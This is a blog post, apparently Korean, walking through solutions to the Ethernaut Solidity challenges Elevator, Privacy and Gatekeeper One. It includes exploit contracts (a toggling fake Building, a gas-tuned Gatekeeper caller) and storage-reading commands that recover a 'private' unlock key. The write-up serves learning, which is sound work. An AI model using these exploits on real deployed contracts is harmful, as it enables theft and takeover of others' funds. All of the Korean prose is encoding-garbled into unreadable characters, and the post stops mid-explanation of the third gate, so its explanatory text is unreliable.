---
layout: post
title: "Ethernaut Solution(2/2)"
date: 2018-09-20
description: # Add post description (optional)
img: leaves.jpg
tag: [Ethereum, Solidity, Ethernaut]
---

### 11. Elevator (difficulty 4/10)

> This elevator won't let you reach the top of your building. Right?

"ì´ ì—˜ë¦¬ë² ì´í„°ëŠ” ë¹Œë”© ê¼­ëŒ€ê¸°ê¹Œì§€ ê°€ì§€ ì•ŠìŠµë‹ˆë‹¤. ë§ìŠµë‹ˆê¹Œ?" ë¬¸ì œê°€ ë” ì–´ë µê²Œ ëŠê»´ì§‘ë‹ˆë‹¤.ğŸ˜…

ì†”ë¦¬ë””í‹°ëŠ” ê°„í˜¹ ì˜ˆìƒì¹˜ ëª»í•œ ë°©í–¥ìœ¼ë¡œ ë™ì‘í•  ë•Œê°€ ìˆìŠµë‹ˆë‹¤. ë¬¸ì œì˜ ì»¨íŠ¸ë™íŠ¸ë¥¼ ì‚´í´ë³´ê² ìŠµë‹ˆë‹¤. ìš°ì„  Buildingì´ë¼ëŠ” ì¸í„°í˜ì´ìŠ¤ê°€ ìˆê³  Elevatorë¼ëŠ” ì»¨íŠ¸ë™íŠ¸ê°€ ìˆìŠµë‹ˆë‹¤.
Building ì¸í„°í˜ì´ìŠ¤ë¥¼ êµ¬í˜„í•˜ë©´ì„œ Elevator ì»¨íŠ¸ë™íŠ¸ë¥¼ ì‚¬ìš©í•  ê²ƒì…ë‹ˆë‹¤.

{% highlight javascript %}
if (! building.isLastFloor(_floor)) {
    floor = _floor;
    top = building.isLastFloor(floor);
}
{% endhighlight %}

`! building.isLastFloor(_floor)`ê°€ trueì´ë©´ ì¡°ê±´ë¬¸ìœ¼ë¡œ ë“¤ì–´ê°‘ë‹ˆë‹¤. ì´ê²ƒì€ isLastFloorê°€ falseì´ë©´
ë§ˆì§€ë§‰ ì¸µì´ ëª‡ ì¸µì¸ì§€ ìƒê´€ì—†ì´ ë§ˆì§€ë§‰ ì¸µì„ ë‚˜íƒ€ë‚´ëŠ” bool topì´ trueê°€ ë  ìˆ˜ ì—†ëŠ” ê²ƒì²˜ëŸ¼ ë³´ì…ë‹ˆë‹¤.

ê·¸ëŸ°ë° ì—¬ê¸°ì„œ ê°„ê³¼í•œ ë¬¸ì œê°€ ìˆìŠµë‹ˆë‹¤. isLastFloorëŠ” ì¸í„°í˜ì´ìŠ¤ë¡œ ì •ì˜ë˜ì–´ ìˆê³  êµ¬í˜„í•˜ê¸° ë‚˜ë¦„ì´ë¼ëŠ” ì ì…ë‹ˆë‹¤. ë˜ ìœ„ì˜ ì¡°ê±´ì„ ì˜ ë³´ë©´ isLastFloorë¥¼ ë‘ ë²ˆ í˜¸ì¶œí•˜ê³  ìˆìŠµë‹ˆë‹¤.
ë‹¤ì‹œ ë§í•´ì„œ isLastFloorì˜ ë‘ ë²ˆì§¸ í˜¸ì¶œí•´ì„œë„ ì²« ë²ˆì§¸ì™€ ë™ì¼í•œ ê°’ì„ ë¦¬í„´í•  ê²ƒì´ë¼ê³  ìƒê°í•˜ëŠ” ê²ƒì´ì£ .

{% highlight javascript %}
interface Building {
    function isLastFloor(uint) view public returns (bool);
}
{% endhighlight %}

ë§Œì•½ì— isLastFloorë¥¼ ì²« ë²ˆì§¸ì—ëŠ” false, ì´ë ‡ê²Œ í•´ì„œ ì¡°ê±´ë¬¸ìœ¼ë¡œ ë“¤ì–´ê°„ ë‹¤ìŒì—, ì¡°ê±´ë¬¸ ë‚´ì—ì„œ, ë‘ ë²ˆì§¸ì—ëŠ” trueë¥¼ ë¦¬í„´í•˜ê²Œ ë§Œë“¤ë©´ ì–´ë–»ê²Œ ë ê¹Œìš”? ì´ë ‡ê²Œ í•˜ë©´
ëª¨ë“  ì¸µì— ê°ˆ ìˆ˜ ìˆëŠ” Elevator ì»¨íŠ¸ë™íŠ¸ê°€ ë˜ëŠ” ê²ƒì…ë‹ˆë‹¤(í† ê¸€ ìŠ¤ìœ„ì¹˜ë¥¼ ìƒê°í•˜ë©´ ë  ê²ƒ ê°™ìŠµë‹ˆë‹¤).

{% highlight javascript %}
pragma solidity ^0.4.25;

interface Building {
    function isLastFloor(uint) view public returns (bool);
}

contract HackBuilding is Building {

    address public owner;
    Elevator public elevator;
    bool public toggleFlag;

    constructor (address _addr) public {
        owner = msg.sender;
        elevator = Elevator(_addr);
    }

     modifier onlyOwner {
        require (msg.sender == owner);
        _;
    }

    function isLastFloor(uint _floor) view public returns (bool) {
        _floor;
        if (!toggleFlag) {
            toggleFlag = true;
            return false;
        } else {
            toggleFlag = false;
            return true;
        }
    }

    function reachTheTopFloor() external onlyOwner {
        elevator.goTo(100);
    }
}

contract Elevator {
    function goTo(uint _floor) public;
}
{% endhighlight %}


ë‹¤ìŒê³¼ ê°™ì€ ê²°ê³¼ê°€ ë‚˜ì˜¤ë©´ ì„±ê³µì…ë‹ˆë‹¤.

{% highlight html %}
await contract.top()
true
{% endhighlight %}

ê·¸ëŸ°ë° ì ê¹ë§Œ! isLastFloor ë©”ì†Œë“œëŠ” ìƒíƒœë³€ìˆ˜ë¥¼ ì½ì„ ìˆ˜ë§Œ ìˆëŠ” view ë©”ì†Œë“œì¸ë° toggleFlag ìƒíƒœë³€ìˆ˜ë¥¼ ì–´ë–»ê²Œ ë°”ê¿€ ìˆ˜ ìˆì£ ? ğŸ˜•
ê·¸ê²ƒì€ ì†”ë¦¬ë””í‹° ì»´íŒŒì¼ëŸ¬ ë²„ì „ì— ë”°ë¼ ë‹¤ë¦…ë‹ˆë‹¤. ì—¬ê¸°ì„œ ì‚¬ìš©í•œ 0.4.25 ì´í•˜ì—ì„œëŠ” view ë¡œ ì§€ì •í–ˆë‹¤ê³  í•˜ì—¬ ì»´íŒŒì¼ ì˜¤ë¥˜ê°€ ë°œìƒí•˜ì§€ëŠ” ì•ŠìŠµë‹ˆë‹¤. ê·¸ëƒ¥ ê²½ê³ ë§Œ í•  ë¿ì´ì£ .
0.5.0 ì´ìƒì—ì„œëŠ” ë³´ë‹¤ ì—„ê²©í•˜ê²Œ viewë¡œ ì§€ì •ëœ ë©”ì†Œë“œì—ì„œ ìƒíƒœë³€ìˆ˜ë¥¼ ë°”ê¾¸ëŠ” ì½”ë“œëŠ” ì»´íŒŒì¼ ì˜¤ë¥˜ê°€ ë°œìƒí•©ë‹ˆë‹¤.

<font color="red" size="2">
{% highlight html %}
TypeError: Function declared as view, but this expression (potentially) modifies the state and thus requires non-payable (the default) or payable.
{% endhighlight %}
</font>


### 12. Privacy (difficulty 8/10)

> Unlock this contract to beat the level.

ì£¼ì–´ì§„ ì»¨íŠ¸ë™íŠ¸ì˜ bool locked = falseë¡œ ë§Œë“¤ë©´ ë˜ëŠ” ë¬¸ì œì…ë‹ˆë‹¤. unlock ë©”ì†Œë“œëŠ” _keyë¥¼ ë°›ì•„ì„œ ì„¸ ë²ˆì§¸ ì•„ì´í…œê³¼ ê°™ì€ì§€
ë¹„êµí•´ì„œ ê°™ìœ¼ë©´ locked = falseë¡œ ë§Œë“­ë‹ˆë‹¤.

{% highlight javascript %}

function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));
    locked = false;
}
{% endhighlight %}

ì§€ë‚œ 8ë²ˆ ë¬¸ì œ Vaultì—ì„œ ë³¸ ê²ƒì²˜ëŸ¼ ìƒíƒœë³€ìˆ˜ê°€ privateë¼ê³  í•´ì„œ ì½ì§€ ëª»í•˜ëŠ” ê²ƒì€ ì•„ë‹™ë‹ˆë‹¤. ì§€ë‚œ ë¬¸ì œì™€ ë‹¤ë¥¸ ì ì€ ê³ ì •ê¸¸ì´ ë°°ì—´ì¸ ê²½ìš°ì— storageì˜ ë ˆì´ì•„ì›ƒì´ ì–´ë–»ê²Œ
ë˜ëŠ”ì§€, ë˜ íƒ€ì… ìºìŠ¤íŒ…ì´ ì–´ë–»ê²Œ ì´ë£¨ì–´ì§€ëŠ”ì§€ ì•Œì•„ì•¼ í•©ë‹ˆë‹¤.


> * Understanding how storage works
* Understanding how parameter parsing works
* Understanding how casting works

ì»¨íŠ¸ë™íŠ¸ì˜ ìƒíƒœë³€ìˆ˜ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤. `bytes32[3] private data`ì— ìš°ë¦¬ê°€ ì°¾ìœ¼ë ¤ê³  í•˜ëŠ” ë°ì´í„°ê°€ ìˆì„ ê²ë‹ˆë‹¤. ì§€ë‚œ ë²ˆì— ì„¤ëª…í•œ ê²ƒì²˜ëŸ¼
ê° ìŠ¬ë¡¯ì€ 32ë°”ì´íŠ¸(256ë¹„íŠ¸) í¬ê¸°ë¡œ 0ë²ˆ ìŠ¬ë¡¯ë¶€í„° ì°¨ë¡€ë¡œ, ì—°ì†ì ìœ¼ë¡œ í• ë‹¹ë©ë‹ˆë‹¤. ìŠ¬ë¡¯ í¬ê¸°ë³´ë‹¤ ì‘ì€ ë°ì´í„° íƒ€ì…ì€ "tightly packed"í•˜ê²Œ ì €ì¥ë©ë‹ˆë‹¤.


{% highlight javascript %}
  bool public locked = true;
  uint256 public constant ID = block.timestamp;
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(now);
  bytes32[3] private data;
{% endhighlight %}


ì—¬ê¸°ì„œ ì•Œì•„ë‘ì–´ì•¼ í•  ê²ƒì€ ìƒíƒœë³€ìˆ˜ë¥¼ constantë¡œ ì„ ì–¸í•˜ëŠ” ê²½ìš°ëŠ” storageì— í• ë‹¹ë˜ì§€ ì•ŠëŠ”ë‹¤ëŠ” ì ì…ë‹ˆë‹¤. constantëŠ” ê°’ íƒ€ì…ë§Œ ì§€ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

> The compiler does not reserve a storage slot for these variables, and every occurrence is replaced by the respective constant expression (which might be computed to a single value by the optimizer).

ì, ê·¸ë ‡ë‹¤ë©´ ìƒíƒœë³€ìˆ˜ ì„ ì–¸ë¶€ë¥¼ ë³´ë©´ì„œ ë ˆì´ì•„ì›ƒì„ ì§ì‘í•´ë³´ê² ìŠµë‹ˆë‹¤. ìš°ì„  ë‹¤ìŒê³¼ ê°™ì´ íŠ¸ëŸ¬í”Œ ì½˜ì†”ì„ í†µí•´ Ropstenì— ì—°ê²°í•œ í›„ `web3.eth.getStorageAt`ìœ¼ë¡œ ì¡°íšŒí•©ë‹ˆë‹¤.
ì²« ë²ˆì§¸ ìŠ¬ë¡¯ì…ë‹ˆë‹¤.

{% highlight html %}
truffle(ropsten)> web3.eth.getStorageAt("0x3e066a43f82688f611916e5fa56e6d4ce5e324ee", 0, "latest",
                                        function(e, result) {
                                            console.log(result)
                                        })
undefined
truffle(ropsten)> 0x000000000000000000000000000000000000000000000000000000aa43ff0a01
{% endhighlight %}

ë‘ ë²ˆì§¸ ì„¸ ë²ˆì§¸, ë„¤ ë²ˆì§¸, ì°¨ë¡€ë¡œ ì¡°íšŒí•´ë´…ì‹œë‹¤. ê·¸ëŸ¼ ë‹¤ìŒê³¼ ê°™ì€ ê²°ê³¼ë¥¼ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤(ë°ì´í„°ëŠ” ë‹¬ë¼ì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤).

{% highlight html %}
web3.eth.getStorageAt("0x3e066a43f82688f611916e5fa56e6d4ce5e324ee", 1, ...)
0x1b1f4f5b10d488f8186dbd44a4bad9081edb28e41c8ea0cb2a6d4a159ea64d88

web3.eth.getStorageAt("0x3e066a43f82688f611916e5fa56e6d4ce5e324ee", 2, ...)
0x12c705440554fb18ddaf8743e55b5f4341a56709b11e3a4be677b7dcfdc1a328

web3.eth.getStorageAt("0x3e066a43f82688f611916e5fa56e6d4ce5e324ee", 3, ...)
0x7310fbc161ab8742d22d56264a4f79ff27c9c291d3eb951fe8bb7024b09d7a5c

web3.eth.getStorageAt("0x3e066a43f82688f611916e5fa56e6d4ce5e324ee", 4, ...)
0x0000000000000000000000000000000000000000000000000000000000000000
{% endhighlight %}

ë‹¤ì„¯ ë²ˆì§¸(ìŠ¬ë¡¯ ì¸ë±ìŠ¤ 4)ë¶€í„°ëŠ” ë°ì´í„°ê°€ ì—†êµ°ìš”. ë”°ë¼ì„œ ì €ì¥ ìŠ¬ë¡¯ì€ ëª¨ë‘ 4ê°œë¥¼ ì‚¬ìš©í•˜ê³  ìˆìŒì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
í•œ ìŠ¬ë¡¯ì˜ í¬ê¸°ê°€ 32ë°”ì´íŠ¸(256ë¹„íŠ¸) ì´ë¯€ë¡œ ê·¸ ì•ˆì— ë“¤ì–´ê°ˆ ìˆ˜ ìˆëŠ” ê²ƒë“¤ì€ ë‹¤ìŒ 4ê°œì˜ ìƒíƒœë³€ìˆ˜ë“¤ì…ë‹ˆë‹¤. ìˆœì„œëŒ€ë¡œ ìŠ¬ë¡¯ì˜ ë’¤ì—ì„œë¶€í„° ì €ì¥ë©ë‹ˆë‹¤.

{% highlight javascript %}
  bool public locked = true;
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(now);
{% endhighlight %}

ì•„ë˜ì™€ ê°™ì´ ë©ë‹ˆë‹¤.

<table>
<tr>
    <td colspan="5" align="center"><b>SLOT 0</b></td>
</tr>
<tr>
    <td width="100"></td>
    <td width="100">uint16 awkwardness</td>
    <td width="100">uint8 denomination</td>
    <td width="100">uint8 flattening</td>
    <td width="100">bool locked</td>
</tr>
<tr>
    <td></td>
    <td>uint16(now)</td>
    <td>255</td>
    <td>10</td>
    <td>true</td>
</tr>
<tr>
    <td>0x0000...0000</td>
    <td>aa43</td>
    <td>ff</td>
    <td>0a</td>
    <td>01</td>
</tr>
</table>


ê³ ì •ê¸¸ì´ ë°°ì—´ì€ ì–´ë–»ê²Œ ë ê¹Œìš”? bytes32ì´ë¯€ë¡œ í•œ ìŠ¬ë¡¯ì”© ì°¨ì§€í•  ê²ƒì…ë‹ˆë‹¤.

{% highlight javascript %}
  bytes32[3] private data;
{% endhighlight %}



<table>
<tr>
    <td align="center" width="100"><b>SLOT 1</b></td>
    <td align="center" width="100"><b>SLOT 2</b></td>
    <td align="center" width="100"><b>SLOT 3</b></td>
</tr>
<tr>
    <td>bytes32 data[0]</td>
    <td>bytes32 data[1]</td>
    <td>bytes32 data[2]</td>
</tr>
<tr>
    <td>0x1b1f...4d88</td>
    <td>0x12c7...a328</td>
    <td>0x7310...7a5c</td>
</tr>
</table>

ê²°êµ­ ìš°ë¦¬ê°€ ì•Œì•„ë‚´ë ¤ê³  í•˜ëŠ” í‚¤ ê°’ì€ data[2]ì…ë‹ˆë‹¤. ë¬¸ì œì—ì„œëŠ” bytes16(data[2])ìœ¼ë¡œ ìºìŠ¤íŒ…í–ˆìœ¼ë¯€ë¡œ Remixì—ì„œ ë‹¤ìŒê³¼ ê°™ì´ ìºìŠ¤íŒ…í•´ì„œ í‚¤ ê°’ì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

{% highlight javascript %}
function convert() public pure returns (bytes16 result) {
    bytes32 data = 0x7310fbc161ab8742d22d56264a4f79ff27c9c291d3eb951fe8bb7024b09d7a5c;
    result = bytes16(data);
}
{% endhighlight %}

bytes16ì€ ì²« ë²ˆì§¸ 16ë°”ì´íŠ¸ë§Œ ì˜ë¼ë‚´ë©´ ë©ë‹ˆë‹¤. ì´ì œ unlock ë©”ì†Œë“œë¥¼ ì‹¤í–‰í•˜ë©´ ë˜ê² êµ°ìš”!

{% highlight html %}
await contract.unlock("0x7310fbc161ab8742d22d56264a4f79ff")
{% endhighlight %}


### 13. Gatekeeper One (difficulty 5/10)

ê°œì¸ì ìœ¼ë¡œ ì œì¼ ì–´ë µë‹¤ê³  ìƒê°ë˜ëŠ” ë¬¸ì œì…ë‹ˆë‹¤.

> Make it past the gatekeeper and register as an entrant to pass this level.

ì´ ë¬¸ì œëŠ” 3ê°œì˜ "Gatekeeper"ê°€ ì¡´ì¬í•©ë‹ˆë‹¤. ê·¸ê²ƒì„ í†µê³¼í•´ì„œ enter ë©”ì†Œë“œë¥¼ ì‹¤í–‰í•˜ê³  entrantì— ê³„ì • ì£¼ì†Œë¥¼ "ë“±ë¡"í•˜ë©´ ë˜ëŠ” ë¬¸ì œì…ë‹ˆë‹¤. ê°ê°ì˜ "Gatekeeper"ëŠ” modifierë¡œ ë©”ì†Œë“œì— ì ìš©ë˜ì–´ ìˆìŠµë‹ˆë‹¤.

{% highlight javascript %}
pragma solidity ^0.4.18;

contract GatekeeperOne {

    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(msg.gas % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(_gateKey) == uint16(_gateKey));
        require(uint32(_gateKey) != uint64(_gateKey));
        require(uint32(_gateKey) == uint16(tx.origin));
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
{% endhighlight %}

modifierëŠ” ì™¼ìª½ gateOneë¶€í„° ì°¨ë¡€ë¡œ ì ìš©ë©ë‹ˆë‹¤. ì²« ë²ˆì§¸ gateOneì€ ì§€ë‚œ Telephoneì—ì„œ ë³¸ ê²ƒì²˜ëŸ¼ tx.originê³¼ msg.senderë¥¼ êµ¬ë¶„í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤.

ë‘ ë²ˆì§¸ëŠ” gateTwoê°€ ì‹¤í–‰ë  ë•Œ ë‚¨ì€ ê°€ìŠ¤ê°€ 8191ë¡œ ë‚˜ëˆ„ì—ˆì„ ë•Œ ë‚˜ë¨¸ì§€ê°€ 0ì´ ë˜ì–´ì•¼ í†µê³¼í•©ë‹ˆë‹¤. ë©”ì†Œë“œ ì‹¤í–‰ì‹œ ê°€ìŠ¤ë¥¼ ì§€ì •í•  ìˆ˜ ìˆìœ¼ë¯€ë¡œ 8191ë¡œ ë‚˜ëˆ„ì–´ ë–¨ì–´ì§€ë„ë¡
ê°€ìŠ¤ë¥¼ ì§€ì •í•˜ë©´ ë  ê²ƒ ê°™ìŠµë‹ˆë‹¤(msg.gasëŠ” gasleft()ë¡œ ë³€ê²½ë˜ì—ˆìŠµë‹ˆë‹¤).

ì„¸ ë²ˆì§¸ gateThreeê°€ ìƒë‹¹íˆ ë‚œí•´í•˜ê²Œ ë³´ì…ë‹ˆë‹¤. 3ê°œì˜ ì¡°ê±´ì„ ë§Œì¡±í•´ì•¼ í†µê³¼í•  ìˆ˜ ìˆëŠ”ë°, ì‚¬ì‹¤ ê·¸ 3ê°œê°€ `_gateKey`ë¥¼ ì§ì‘í•  ìˆ˜ ìˆëŠ” íŒíŠ¸ê°€ ë©ë‹ˆë‹¤.

ìš°ì„  ë‘ ë²ˆì§¸ë¶€í„° ì‚´í´ë³´ê² ìŠµë‹ˆë‹¤. ê°€ìŠ¤ì˜ ì†Œë¹„ íŒ¨í„´ì€ ì»´íŒŒì¼ëŸ¬ ë²„ì „ì— ë”°ë¼ ì¡°ê¸ˆì”© ë‹¤ë¥´ë‹¤ê³  í•©ë‹ˆë‹¤. ë”°ë¼ì„œ ë¬¸ì œì˜ ì»¨íŠ¸ë™íŠ¸ì™€ <b>ë™ì¼í•œ ì»´íŒŒì¼ëŸ¬ ë²„ì „ 0.4.18ë¡œ</b> ë§ì¶”ì–´ì•¼ í•©ë‹ˆë‹¤. ìš°ë¦¬ê°€ ê´€ì‹¬ì„
ê°€ì ¸ì•¼ í•˜ëŠ” ê²ƒì€ gateTwoì— ì§„ì…í–ˆì„ ë•Œ ë‚¨ì€ ê°€ìŠ¤ì…ë‹ˆë‹¤. ì²˜ìŒ ë©”ì†Œë“œë¥¼ ì‹¤í–‰í• ë•Œ ê°€ìŠ¤ë¥¼ ì•Œê³  ìˆìœ¼ë‹ˆ gateTwoê¹Œì§€ ì™”ì„ ë•Œì˜ ë‚¨ì€ ê°€ìŠ¤ë¥¼ ì•Œë©´ ê·¸ ì°¨ì´ê°€ ì†Œëª¨ëœ ê°€ìŠ¤ê°€ ë  ê²ƒì…ë‹ˆë‹¤.

ê·¸ë ‡ë‹¤ë©´ ê·¸ ê°’ì— ë”í•˜ì—¬ 8191ì˜ ë°°ìˆ˜ë¡œ ê°€ìŠ¤ë¥¼ ì§€ì •í•˜ë©´ gateTwoë¥¼ í†µê³¼í•  ê²ƒì…ë‹ˆë‹¤.
ì¦‰ `msg.gas % 8191` ì—°ì‚°ì„ ìˆ˜í–‰í•˜ëŠ” ì‹œì ì— ê°€ìŠ¤ëŠ” 8190ìœ¼ë¡œ ë‚˜ëˆ„ì–´ ë–¨ì–´ì§€ëŠ” ê°’ì´ ë‚¨ì•„ ìˆê¸°ë§Œ í•˜ë©´ ë©ë‹ˆë‹¤(ë¬¼ë¡  ì´í›„ íŠ¸ëœì­ì…˜ì´ ì™„ë£Œë  ìˆ˜ ìˆëŠ” ì¶©ë¶„í•œ ê°€ìŠ¤ê°€ í•„ìš”í•©ë‹ˆë‹¤).

ìš°ì„  Remixì—ì„œ ë‹¤ìŒê³¼ ê°™ì€ ì»¨íŠ¸ë™íŠ¸ë¥¼ ì‘ì„±í•©ë‹ˆë‹¤. Runtime ì„¤ì •ì€ `Javascript VM`ìœ¼ë¡œ ë§ì¶”ê³ , ì»´íŒŒì¼ëŸ¬ ë²„ì „ë„ 0.4.18ë¡œ ë³€ê²½í•©ë‹ˆë‹¤.

{% highlight javascript %}
pragma solidity ^0.4.18;

import "./Gatekeeper.sol";

contract hackGatekeeperOne {

  address public gateKeeper;
  bytes8 public gateKey;

  function hackGatekeeperOne(address _addr) public {
      gateKeeper = GatekeeperOne(_addr);
  }

  function run() public {
    gateKey = 0x1000000000000000;
    bool bOk = address(gateKeeper).call.gas(500000)(bytes4(keccak256("enter(bytes8)")), gateKey);
    if (!bOk) {
        revert();
    }
  }
}
{% endhighlight %}

ì—¬ê¸°ì„œ importëœ ì»¨íŠ¸ë™íŠ¸ëŠ” ë¬¸ì œì—ì„œ ì£¼ì–´ì§„ ì»¨íŠ¸ë™íŠ¸ì…ë‹ˆë‹¤.
ìœ„ ì»¨íŠ¸ë™íŠ¸ì—ì„œ ë³´ëŠ” ê²ƒì²˜ëŸ¼ ë©”ì†Œë“œ í˜¸ì¶œí•  ë•Œ ê°€ìŠ¤ë¥¼ ì§€ì •í•´ì¤„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. gateKeyëŠ” ì•„ì§ ëª¨ë¥´ê¸° ë•Œë¬¸ì— ì„ì˜ì˜ ê°’ì„ ì£¼ê³  ì‹œì‘í•©ë‹ˆë‹¤.
ìš°ì„  gateTwoë¥¼ í†µê³¼í•˜ê¸° ìœ„í•œ ê°€ìŠ¤ë¥¼ ì•Œì•„ë‚´ëŠ” ê²ƒì´ ëª©ì ì…ë‹ˆë‹¤. ì¼ë‹¨ ê°€ìŠ¤ 500,000ìœ¼ë¡œ ë©”ì†Œë“œë¥¼ ì‹¤í–‰í•´ë³´ê¸°ë¡œ í•˜ê² ìŠµë‹ˆë‹¤.

run()ì„ ì‹¤í–‰í•˜ë©´ ì˜¤ë¥˜ê°€ ë°œìƒí•  ê²ƒì…ë‹ˆë‹¤. ë‚˜ì¤‘ì— ì•Œê²Œ ë˜ê² ì§€ë§Œ ì´ê²ƒì€ ì¼ë¶€ëŸ¬ ë°œìƒì‹œí‚¨ ì˜¤ë¥˜ì…ë‹ˆë‹¤. Remixì˜ Debuggerë¥¼ í™œìš©í•´ì„œ ê°€ìŠ¤ë¥¼ ì‚´í´ë³´ê¸°ë¡œ í•©ë‹ˆë‹¤.
ì½˜ì†” ìœˆë„ìš°ì—ì„œ Debugë¥¼ í´ë¦­í•˜ë©´ ë””ë²„ê±° í™”ë©´ìœ¼ë¡œ ì´ë™í•©ë‹ˆë‹¤. `Step over forward`ë¥¼ ì—¬ëŸ¬ ë²ˆ í´ë¦­í•´ì„œ Gatekeeper.solë¡œ ì§„ì…í•©ë‹ˆë‹¤. ì´ ë•Œ ë””ë²„ê±°ì˜ <b>remaining gas</b>ì—
í‘œì‹œë˜ëŠ” ê°’ì„ ì£¼ì˜ê¹Šê²Œ ë´ì•¼ í•©ë‹ˆë‹¤. 500,000ì´ í‘œì‹œë˜ë©´ enter() ë©”ì†Œë“œê°€ ì‹¤í–‰ë˜ê¸° ì‹œì‘í•˜ëŠ” ì‹œì ì…ë‹ˆë‹¤. ê³„ì† Step over forwardë¥¼ í´ë¦­í•´ì„œ
remaining gasê°€ ì¤„ì–´ë“œëŠ” ê²ƒì„ ê´€ì°°í•©ë‹ˆë‹¤.

![fig01]({{site.baseurl}}/assets/img/ethernaut/remix_debug.PNG)

ì–´ëŠ ìˆœê°„ì— ë“œë””ì–´ modifierê°€ ì‹¤í–‰ë˜ê¸° ì‹œì‘í•˜ëŠ”ë° ì´ ë•Œë¶€í„°ëŠ” `Step into`ë¥¼ í´ë¦­í•©ë‹ˆë‹¤. ì¤‘ìš”í•œ ê²ƒì€ gateTwoì—ì„œ ë‹¤ìŒê³¼ ê°™ì€ ë‚˜ë¨¸ì§€
ì—°ì‚° ë¶€ë¶„ì—ì„œ remaining gasê°€ ì–¼ë§ˆì¸ì§€ í™•ì¸í•´ì•¼ í•œë‹¤ëŠ” ê²ƒì…ë‹ˆë‹¤.

![fig02]({{site.baseurl}}/assets/img/ethernaut/remix_debug2.PNG)

ì•„ë˜ì™€ ê°™ì´ 499,785ê°€ ë‚˜ì™”ìŠµë‹ˆë‹¤. ê·¸ë ‡ë‹¤ë©´ enter()ë©”ì†Œë“œë¥¼ ì‹¤í•´í•  ë•Œ ì£¼ì…í•œ ê°€ìŠ¤ 500,000ê³¼ ì°¨ì´ëŠ” 215ê°€ ë©ë‹ˆë‹¤. ë”°ë¼ì„œ gateTwoê¹Œì§€ ì‹¤í–‰í•  ë•Œ ì†Œëª¨ëœ ê°€ìŠ¤ëŠ” 215ê°€ ë˜ê² êµ°ìš”!

ê·¸ë ‡ë‹¤ë©´ ë‚¨ì€ ê°€ìŠ¤ê°€ 8191ì˜ ì •ìˆ˜ ë°°ê°€ ëœë‹¤ë©´ `require(msg.gas % 8191 == 0)`ì„ í†µê³¼í•  ê²ƒì…ë‹ˆë‹¤. í˜„ì¬ 499,785ëŠ” ë‹¹ì—°íˆ ì¡°ê±´ì„ ë§Œì¡±ì‹œí‚¤ì§€ ëª»í•˜ë¯€ë¡œ
íŠ¸ëœì­ì…˜ì´ ì‹¤íŒ¨í•œ ê²ƒì…ë‹ˆë‹¤.

![fig03]({{site.baseurl}}/assets/img/ethernaut/remix_debug3.PNG)

ê°€ìŠ¤ë¥¼ ë‹¤ìŒê³¼ ê°™ì´ ì§€ì •í•˜ê² ìŠµë‹ˆë‹¤.

{% highlight html %}
215 + (8191 x 100) = 81,9315
{% endhighlight %}

ì»¨íŠ¸ë™íŠ¸ëŠ” ë‹¤ìŒê³¼ ê°™ì´ ìˆ˜ì •í•˜ë©´ ë˜ê² ìŠµë‹ˆë‹¤.


{% highlight javascript %}

function run() public {
    gateKey = 0x1000000000000000;
    bool bOk = address(gateKeeper).call.gas(819315)(bytes4(keccak256("enter(bytes8)")), gateKey);
    if (!bOk) {
        revert();
    }
}
{% endhighlight %}

ê·¸ ë‹¤ìŒì—ëŠ” ì„¸ ë²ˆì§¸ ê´€ë¬¸ bytes8 íƒ€ì…ì˜ gateKeyë¥¼ ì•Œì•„ë‚´ì•¼ í•©ë‹ˆë‹¤. ë‹¤ìŒ ì¡°ê±´ìœ¼ë¡œë¶€í„° ì–´ë–»ê²Œ ì•Œì•„ë‚¼ ìˆ˜ ìˆì„ê¹Œìš”? ì˜ ë³´ë©´ ì´ë¯¸ ì•Œê³  ìˆëŠ” ê°’ì´ ìˆìŠµë‹ˆë‹¤. ë°”ë¡œ `tx.origin` ì…ë‹ˆë‹¤.
ì´ê²ƒì€ ë©”íƒ€ë§ˆìŠ¤í¬ì˜ ì§€ê°‘ ê³„ì •ì´ ë  ê²ƒì…ë‹ˆë‹¤. ê²°êµ­ gateKeyëŠ” ì§€ê°‘ ê³„ì •ìœ¼ë¡œë¶€í„° ë§Œë“¤ì–´ì§€ëŠ” ê²ƒì„ì„ ì§ì‘í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

{% highlight javascript %}
 modifier gateThree(bytes8 _gateKey) {
     require(uint32(_gateKey) == uint16(_gateKey));
     require(uint32(_gateKey) != uint64(_gateKey));
     require(uint32(_gateKey) == uint16(tx.origin));
     _;
 }
{% endhighlight %}

ìœ„ì˜ ì¡°ê±´ ëª¨ë‘ íƒ€ì… ìºìŠ¤íŒ…í•œ ê²ƒë“¤ì´ ë¹„êµ ì—°ì‚°ìë¡œ ê°™ê±°ë‚˜ ë‹¤ë¦„ì„ ë‚˜íƒ€ë‚´ê³  ìˆìŠµë‹ˆë‹¤. ì¼ë°˜ì ìœ¼ë¡œ í° íƒ€ì…ì„ ì‘ì€ íƒ€ì…ìœ¼ë¡œ ë°”ê¾¸ë©´ ë°ì´í„°ê°€ ì†Œì‹¤ë˜ê³  ì„œë¡œ ë‹¤ë¥¸ ê°’ì´
ë‚˜ì˜µë‹ˆë‹¤. ê·¸ëŸ°ë° ë‘ ê°œì˜ `==` ì¡°ê±´ì„ ë³´ë©´ ì¢€ ì´ìƒí•˜ë‹¤ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

{% highlight javascript %}

require(uint32(_gateKey) == uint16(_gateKey));
require(uint32(_gateKey) == uint16(tx.origin));

{% endhighlight %}

